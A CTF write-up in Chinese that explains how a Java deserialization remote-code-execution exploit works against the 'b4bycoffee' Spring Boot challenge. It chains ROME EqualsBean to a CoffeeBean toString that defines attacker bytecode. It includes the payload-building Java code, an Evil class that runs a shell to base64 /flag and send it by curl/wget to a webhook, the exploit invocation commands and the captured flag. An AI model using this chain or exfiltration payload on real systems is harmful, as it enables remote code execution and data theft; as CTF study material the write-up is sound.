# b4bycoffee — Java 反序列化 RCE（ROME EqualsBean → CoffeeBean.toString → defineClass）

## 基本信息

- **题目 / 来源：** `b4bycoffee`（`b4bycoffee-0.0.1-SNAPSHOT.jar`）
- **方向：** web
- **远程地址：** `http://49.232.142.230:18056`
- **附件：** `/Users/laiandi/ctf/challenges/web/b4bycoffee-0.0.1-SNAPSHOT.jar`
  - sha256 `ba0177c10cfb8c535f954728ab61b27f5a6d6bc7f09297a69903ad912400bae1`
- **运行环境：** Spring Boot 2.7.2 fat jar，`Build-Jdk-Spec: 1.8`，内嵌 Tomcat 9.0.65，
  自带 `rome-1.7.0.jar` / `rome-utils-1.7.0.jar` / `jdom2-2.0.6.1.jar`
- **Flag：** `flag{7cb304ea08782ceaf3e5bb07af847a18}`

## 信息收集

```bash
$ file b4bycoffee-0.0.1-SNAPSHOT.jar
Java archive data (JAR)
$ unzip -l b4bycoffee-0.0.1-SNAPSHOT.jar | grep -E "classes/|lib/rome"
... BOOT-INF/classes/com/example/b4bycoffee/ ...
... BOOT-INF/lib/rome-1.7.0.jar
... BOOT-INF/lib/rome-utils-1.7.0.jar
$ curl -s http://49.232.142.230:18056/
Welcome...
Do you want a cup of coffee？
```

用 CFR 反编译 `BOOT-INF/classes`，得到两个接口和一个自定义 `ObjectInputStream`：

- `GET /` → 一段欢迎文字。
- `POST /b4by/coffee` → 接收 JSON `CoffeeRequest`；如果 `Venti` 字符串字段存在，就
  **base64 解码后反序列化**。
- `AntObjectInputStream` 重写了 `resolveClass`，维护一个**类黑名单**。
- `CoffeeBean` —— 一个可序列化的 `ClassLoader`，其 `toString()` 会调用
  `defineClass(null, ClassByte, 0, len)` 然后 `clazz.newInstance()`。

`coffeeController`：

```java
@RequestMapping("/b4by/coffee")
public Message order(@RequestBody CoffeeRequest coffee) throws ... {
    if (coffee.Venti != null) {
        ByteArrayInputStream in = new ByteArrayInputStream(Base64.getDecoder().decode(coffee.Venti));
        AntObjectInputStream ois = new AntObjectInputStream(in);
        Venti venti = (Venti) ois.readObject();
        return new Message(200, venti.getcoffeeName());
    }
    ... // 咖啡配方判断，与本漏洞无关
}
```

`AntObjectInputStream` 的黑名单：

```java
this.list.add(BadAttributeValueExpException.class.getName());
this.list.add(ObjectBean.class.getName());     // com.rometools.rome.feed.impl.ObjectBean
this.list.add(ToStringBean.class.getName());   // com.rometools.rome.feed.impl.ToStringBean
this.list.add(TemplatesImpl.class.getName());
this.list.add(Runtime.class.getName());
```

`CoffeeBean`：

```java
public class CoffeeBean extends ClassLoader implements Serializable {
    private String name = "Coffee bean";
    private byte[] ClassByte;

    public String toString() {
        CoffeeBean coffeeBean = new CoffeeBean();
        Class<?> clazz = coffeeBean.defineClass(null, this.ClassByte, 0, this.ClassByte.length);
        Object o = null;
        try { o = clazz.newInstance(); }
        catch (InstantiationException | IllegalAccessException e) { ... }
        return "A cup of Coffee --";
    }
}
```

## 漏洞分析

经典的 ROME 链是 `HashMap → ObjectBean → ToStringBean → TemplatesImpl`，但本题把
`ObjectBean` 和 `ToStringBean` 都拉黑了。它**没有**拉黑
`com.rometools.rome.feed.impl.EqualsBean`，同时又给了我们一个 `CoffeeBean`——它的
`toString()` 本身就是一个代码执行原语（`defineClass` + `newInstance`）。

缺失的触发点就在 `EqualsBean.beanHashCode()`：

```java
public int hashCode() { return this.beanHashCode(); }
public int beanHashCode() { return this.obj.toString().hashCode(); }
```

因此，把一个 `CoffeeBean` 包进 `EqualsBean`，再让某个 `hashCode()` 被调用，就会进入
`CoffeeBean.toString()`，从而定义并实例化我们提供的字节码 —— 拿到 RCE。而 `HashMap`
的 key 正好提供了这个触发：`HashMap.readObject()` 会对每个 key 重新计算 `hash(key)`，
也就是调用 `key.hashCode()`。

整条链：

```
HashMap.readObject()
 └─ putVal(hash(key), key, value, ...)          // key = EqualsBean
     └─ EqualsBean.hashCode() → beanHashCode()
         └─ CoffeeBean.toString()
             ├─ defineClass(null, ClassByte, 0, len)   // 我们提供的 Evil 字节码
             └─ Class.newInstance()                    // 执行 Evil() 构造函数
```

Controller 里的 `(Venti) readObject()` 强转会抛 `ClassCastException`（顶层对象是
`HashMap`），但这是在 `readObject()` **执行完恶意代码之后**才发生——这正是返回 500 的原因。

## 为什么可行（关键常量）

- 接口：`POST /b4by/coffee`，请求头 `Content-Type: application/json`，
  body 为 `{"Venti":"<base64 序列化对象>"}`。
- 触发类：`com.rometools.rome.feed.impl.EqualsBean`（未被拉黑）。
- `EqualsBean` 反序列化时恢复的私有字段：`beanClass: Class`、`obj: Object`。因为 JVM
  不会执行构造函数，所以 `Class`/实例的组合不受构造校验约束。
- 承载 payload 的类：`com.example.b4bycoffee.model.CoffeeBean`，私有字段
  `ClassByte: byte[]`——就是传给 `ClassLoader.defineClass` 的原始字节。
- 恶意类必须有 **public 无参构造函数**（`newInstance()` 会调用它），把 shell 命令写在
  构造函数里即可。
- 构建期细节：`HashMap.put()` 会立即调用 `hashCode()`。为避免在**构造 payload 时**就触发
  代码，先用一个无害的类填好 `CoffeeBean.ClassByte`，调用 `map.put(...)`，然后再用反射把
  `ClassByte` 替换成真正的 payload，最后才序列化。

## 攻击链

```
POST /b4by/coffee  {"Venti": b64}
      │
      ▼
Base64 解码 → AntObjectInputStream.readObject()
      │  （黑名单：BadAttributeValueExpException、ObjectBean、ToStringBean、TemplatesImpl、Runtime）
      ▼
java.util.HashMap.readObject()
      │  putVal(hash(key), …)  → EqualsBean.hashCode()
      ▼
EqualsBean.beanHashCode() → obj.toString()
      │
      ▼
CoffeeBean.toString()
      ├─ defineClass(null, 攻击者字节码, 0, n)
      └─ clazz.newInstance() → Evil() → Runtime.exec("/bin/sh -c …")
                                    │
                                    └─ curl/wget 把 flag 回传到 webhook
```

## 完整脚本

可运行脚本：[`exploits/web/b4bycoffee.py`](../../exploits/web/b4bycoffee.py)。它从提供的 fat jar
中提取 ROME 和业务类，编译一个极小的 `Evil` 类（Java 8 字节码），在 Java 里构造
`HashMap`/`EqualsBean`/`CoffeeBean` payload，再 POST 发送。

```bash
# 把 flag 回传到 webhook（输出以 base64 放在 ?d= 参数里）
python3 exploits/web/b4bycoffee.py \
    --target http://49.232.142.230:18056 \
    --webhook https://webhook.site/<uuid> \
    --cmd 'cat /flag'

# 只生成 payload（base64），供自己的发送程序使用
python3 exploits/web/b4bycoffee.py --print-only --cmd 'id'
```

核心生成代码（payload 简化版）：

```java
public class Evil {
    public Evil() {
        try {
            String sh = "o=$(cat /flag 2>&1 | base64 -w0); "
                      + "curl -s -m 10 \"https://webhook.site/<uuid>/?d=$o\" >/dev/null 2>&1; "
                      + "wget -q -O /dev/null \"https://webhook.site/<uuid>/?d=$o\" >/dev/null 2>&1";
            Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", sh});
        } catch (Throwable e) {}
    }
}
```

```java
CoffeeBean cb = new CoffeeBean();
Field f = CoffeeBean.class.getDeclaredField("ClassByte"); f.setAccessible(true);
f.set(cb, benignClassBytes);                 // 构建期无害
EqualsBean eb = new EqualsBean(CoffeeBean.class, cb);
HashMap<Object,Object> map = new HashMap<>();
map.put(eb, "coffee");                       // 触发 hashCode，此时只会定义无害的 Benign
f.set(cb, evilClassBytes);                   // 换成真正的 payload
new ObjectOutputStream(...).writeObject(map);
```

## 实际输出

```
$ .venv/bin/python exploits/web/b4bycoffee.py --target http://49.232.142.230:18056 \
      --webhook https://webhook.site/<uuid> --cmd 'cat /flag'
[*] HTTP 500
{"timestamp":"2026-09-28T00:56:13.149+00:00","status":500,"error":"Internal Server Error","path":"/b4by/coffee"}
[*] check the webhook for ?d=<base64 output>

# webhook ?d= 解码后：
== /flag ==
flag{7cb304ea08782ceaf3e5bb07af847a18}
== /flag.txt ==
...
==LS==
-rw-r--r--   1 root root   39 Sep 28 00:45 flag
```

第一次探测 payload（`ls -la /`）显示 flag 位于文件系统根目录 `/flag`
（`-rw-r--r-- 1 root root 39 ... flag`）。

## 踩坑 / 死路

- **黑名单不是你以为的 ROME 黑名单。** `ObjectBean`/`ToStringBean` 被禁用，所以标准的
  `ysoserial ROME` payload 会在 `resolveClass` 处失败。可用的触发点是**未被拉黑**的
  `EqualsBean`——它的 `hashCode()` 会调用 `obj.toString()`。
- **`HashMap.put()` 会在构建期触发。** 先给 `ClassByte` 装一个无害类，`put` 之后再替换，
  可以避免构造脚本自己执行自己的 payload。
- **`newInstance()` 需要 public 无参构造函数**；只写静态初始化块不够，因为类只有在首次
  主动使用（`newInstance`）时才会初始化。
- **响应永远是 500。** `readObject()` 返回 `HashMap`，强转 `Venti` 抛 `ClassCastException`；
  输出必须带外回传（HTTP 回调 / DNS / 反弹 shell）。不要把 500 误判为利用失败。
- **目标 Java 8 vs 本地新 JDK。** `AntObjectInputStream.<init>()` 引用了
  `com.sun.org.apache.xalan...TemplatesImpl`，在 JDK 9+ 本地测试时需要
  `--add-exports java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED`；
  远程 JDK 8 不需要。payload 字节码要用 `javac --release 8` 编译。

## 验证

- 本地复现同一链条：用 `TestDeser` 把 base64 payload 喂给真实的 `AntObjectInputStream`，
  成功通过 `CoffeeBean.toString()` 生成了 `/tmp/b4by_pwned`。
- 远程通过两个独立的 webhook 各验证一次；回调里带有 `/flag` 的内容
  `flag{7cb304ea08782ceaf3e5bb07af847a18}`，符合 `flag{...}` 格式。
